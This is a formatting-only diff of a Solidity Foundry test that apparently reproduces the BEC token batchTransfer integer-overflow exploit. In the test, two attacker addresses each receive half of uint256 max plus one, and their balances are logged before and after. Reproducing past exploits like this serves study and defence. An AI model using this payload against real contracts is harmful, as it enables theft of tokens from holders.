@@ -6,7 +6,9 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface BECToken {
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
     function batchTransfer(
         address[] calldata _receivers,
         uint256 _value
@@ -30,31 +32,15 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Before Exploit, Attacker1 BEC Balance",
-            bec.balanceOf(attacker1),
-            18
-        );
-        emit log_named_decimal_uint(
-            "Before Exploit, Attacker2 BEC Balance",
-            bec.balanceOf(attacker2),
-            18
-        );
+        emit log_named_decimal_uint("Before Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
+        emit log_named_decimal_uint("Before Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18);
 
         address[] memory receivers = new address[](2);
         receivers[0] = attacker1;
         receivers[1] = attacker2;
         bec.batchTransfer(receivers, type(uint256).max / 2 + 1);
 
-        emit log_named_decimal_uint(
-            "After Exploit, Attacker1 BEC Balance",
-            bec.balanceOf(attacker1),
-            18
-        );
-        emit log_named_decimal_uint(
-            "After Exploit, Attacker2 BEC Balance",
-            bec.balanceOf(attacker2),
-            18
-        );
+        emit log_named_decimal_uint("After Exploit, Attacker1 BEC Balance", bec.balanceOf(attacker1), 18);
+        emit log_named_decimal_uint("After Exploit, Attacker2 BEC Balance", bec.balanceOf(attacker2), 18);
     }
 }
